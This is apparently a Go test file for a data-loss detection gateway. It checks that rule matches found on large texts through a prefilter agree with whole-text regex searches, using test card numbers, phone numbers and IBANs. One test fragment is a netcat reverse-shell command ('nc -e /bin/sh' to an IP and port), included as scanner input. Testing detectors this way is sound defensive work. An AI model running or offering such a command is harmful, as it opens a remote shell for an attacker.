// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"math/rand"
	"reflect"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/rxprefilter"
)

// TestLargeTextRuleAnswersAreTheWholeTextAnswers pins that every shipped rule,
// in every pack, gives for a large text the first accepted match (offsets
// included) it gives when its regex reads the whole text, so searching only
// the runs of bytes a card, phone or IBAN rule names changes no finding. The
// text mixes separators, word-boundary neighbours, rejected and valid card
// numbers and non-ASCII bytes.
func TestLargeTextRuleAnswersAreTheWholeTextAnswers(t *testing.T) {
	fragments := []string{
		" ", "\n", "\t", "-", ".", "+", "(", ")", ":", "_", "x", "note", "lorem ipsum dolor", "12", "2024", "4111",
		"4111 1111 1111 1112", "4532 0151 1283 0366", "4532015112830367", "4111 1111 1111 1111", "x4111111111111111", "4111111111111111x", "5555 5555 5555 4444",
		"3782 822463 10005", "6011 1111 1111 1117", "GB82 WEST 1234 5698 7654 32", "gb82west12345698765432",
		"(555) 123-4567", "555-123-4567", "+1 555 123 4567", "+44 20 7946 0958", "nc -e /bin/sh 203.0.113.9 4444",
		"alice@example.com", "é", "K", "\xff",
	}
	rng := rand.New(rand.NewSource(1036))
	for _, pack := range []string{"", "strict", "permissive"} {
		generation := snapshotRulePackGeneration(pack)
		for round := 0; round < 3; round++ {
			var b strings.Builder
			for b.Len() < 80<<10 {
				b.WriteString(fragments[rng.Intn(len(fragments))])
				if rng.Intn(4) == 0 {
					b.WriteString("the quick brown fox jumps over the lazy dog ")
				}
			}
			text := b.String()
			scan := rxprefilter.NewText(text)
			raw := &ruleScanText{text: text}
			for ci := range generation.categories {
				for ri := range generation.categories[ci].Rules {
					rule := generation.categories[ci].Rules[ri]
					if rule.Pattern == nil || !raw.mayMatch(rule.Pattern) {
						continue
					}
					got := firstAcceptedRuleMatchIn(rule, scan)
					want := firstAcceptedRuleMatch(rule, text)
					if !reflect.DeepEqual(got, want) {
						t.Fatalf("pack %q rule %s round %d: large-text answer %v, whole-text answer %v", pack, rule.ID, round, got, want)
					}
				}
			}
		}
	}
}

// TestLargeTextCardRuleReadsPastARejectedCandidate pins the validator path of
// a rule answered from runs: a rejected card-shaped number early in a large
// text does not hide a valid one later, and a text with only the rejected
// number has no accepted match.
func TestLargeTextCardRuleReadsPastARejectedCandidate(t *testing.T) {
	generation := snapshotRulePackGeneration("")
	var rule *PatternRule
	for ci := range generation.categories {
		for ri := range generation.categories[ci].Rules {
			if generation.categories[ci].Rules[ri].ID == "ENT-CC-VISA" {
				rule = &generation.categories[ci].Rules[ri]
			}
		}
	}
	if rule == nil {
		t.Fatal("rule ENT-CC-VISA is not in the default pack")
	}
	filler := strings.Repeat("note lorem ipsum dolor sit amet consectetur adipiscing elit\n", 2<<10)
	rejected := "card 4532 0151 1283 0367 placeholder\n"
	valid := "card 4532 0151 1283 0366 on file\n"
	if loc := firstAcceptedRuleMatchIn(*rule, rxprefilter.NewText(filler+rejected+filler)); loc != nil {
		t.Fatalf("a rejected card number was accepted at %v", loc)
	}
	text := filler + rejected + filler + valid + filler
	want := strings.Index(text, "4532 0151 1283 0366")
	loc := firstAcceptedRuleMatchIn(*rule, rxprefilter.NewText(text))
	if len(loc) != 2 || loc[0] != want {
		t.Fatalf("a valid card number after a rejected one was found at %v, want offset %d", loc, want)
	}
	if whole := firstAcceptedRuleMatch(*rule, text); !reflect.DeepEqual(loc, whole) {
		t.Fatalf("found %v, whole-text search %v", loc, whole)
	}
}
